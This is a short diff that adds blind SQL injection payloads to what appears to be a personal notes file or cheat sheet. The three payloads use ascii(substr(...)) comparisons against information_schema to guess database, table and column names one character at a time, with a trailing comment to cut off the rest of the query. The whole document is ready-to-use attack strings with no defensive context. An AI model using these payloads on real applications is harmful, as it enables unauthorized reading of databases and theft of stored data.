@@ -1,2 +1,8 @@
 Database names:
+abc' AND (ascii(substr((select distinct table_schema from information_schema.tables limit 1) ,1,1))) = 105; -- --
 
+Tables_names:
+abc' AND (ascii(substr((select distinct table_name from information_schema.tables where table_schema="test" limit 1) ,1,1))) = 108; -- --
+
+Columns_names:
+abc' AND (ascii(substr((select distinct column_name from information_schema.columns where table_schema="test" and table_name="list" limit 1) ,1,1))) = 105; -- --
